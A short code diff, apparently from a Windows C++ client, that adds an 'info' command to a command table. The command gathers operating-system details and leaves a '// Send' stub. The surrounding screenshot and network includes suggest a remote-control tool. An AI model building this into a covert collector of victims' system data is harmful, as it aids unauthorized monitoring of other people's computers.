@@ -5,6 +5,7 @@
 #include "Network.h"
 #include "Screenshot.h"
 #include "Settings.h"
+#include "Info.h"
 
 static std::vector<std::string> split(const std::string &s, char delim) {
 	std::stringstream ss(s);
@@ -162,6 +163,13 @@ command_t commandDefs[] = {
 
 				g_2: DeleteFileA(file_name);
 				g_1: free(resp);
+			}
+		},
+		{
+			"info", [&](std::vector<std::string> args) {
+				std::string osInfo = info.GetInformation();
+
+				// Send
 			}
 		}
 };
